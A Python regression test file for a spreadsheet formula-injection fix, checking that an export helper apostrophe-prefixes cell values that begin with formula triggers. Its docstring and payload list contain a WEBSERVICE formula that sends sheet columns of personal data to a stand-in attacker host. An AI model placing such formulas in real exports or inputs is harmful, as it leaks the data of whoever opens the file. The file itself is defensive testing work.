"""Regression tests for #1081-G (stored Excel/CSV formula injection).

A student's free-text form-field value was written unescaped into the `.xlsx`
exports reviewers download. openpyxl promotes a leading `=`/`+`/`-`/`@` to a live
formula cell, so a payload like
``=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))`` can reference the
whole sheet's PII columns and exfiltrate them once a reviewer opens the file.

`excel_safe_cell_value` apostrophe-prefixes any string starting with a formula
trigger so the cell is treated as literal text.
"""

import io

import pytest
from openpyxl import Workbook, load_workbook

from app.utils.excel_security import excel_safe_cell_value

FORMULA_PAYLOADS = [
    '=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))',
    "=1+1",
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
    "\t=cmd",
    "\r=cmd",
    "\n=cmd",
]

SAFE_VALUES = ["王小明", "310460031", "nctu@g2.nctu.edu.tw", "0912345678", ""]


@pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
def test_formula_payloads_are_neutralized(payload):
    out = excel_safe_cell_value(payload)
    assert out.startswith("'"), f"{payload!r} was not prefixed"
    assert out == "'" + payload


@pytest.mark.parametrize("value", SAFE_VALUES)
def test_safe_values_pass_through_unchanged(value):
    assert excel_safe_cell_value(value) == value


def test_non_string_values_pass_through_unchanged():
    assert excel_safe_cell_value(5) == 5
    assert excel_safe_cell_value(3.14) == 3.14
    assert excel_safe_cell_value(None) is None


def test_openpyxl_roundtrip_treats_sanitized_value_as_text_not_formula():
    """Prove the guard actually changes openpyxl's cell data_type from 'f'
    (formula) to 's' (string) for a real workbook round-trip."""
    payload = '=WEBSERVICE("https://attacker/x")'

    # Unsanitized: openpyxl records a live formula cell.
    wb = Workbook()
    ws = wb.active
    ws.cell(row=1, column=1, value=payload)
    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    reloaded = load_workbook(buf)
    assert reloaded.active.cell(row=1, column=1).data_type == "f"

    # Sanitized: literal string, not a formula.
    wb2 = Workbook()
    ws2 = wb2.active
    ws2.cell(row=1, column=1, value=excel_safe_cell_value(payload))
    buf2 = io.BytesIO()
    wb2.save(buf2)
    buf2.seek(0)
    reloaded2 = load_workbook(buf2)
    cell = reloaded2.active.cell(row=1, column=1)
    # The critical property: it is a string cell ('s'), NOT a formula ('f').
    assert cell.data_type == "s"
    # openpyxl keeps the guarding apostrophe in the raw stored value; Excel/
    # LibreOffice hide it in the UI and never evaluate the cell as a formula.
    assert cell.value == "'" + payload
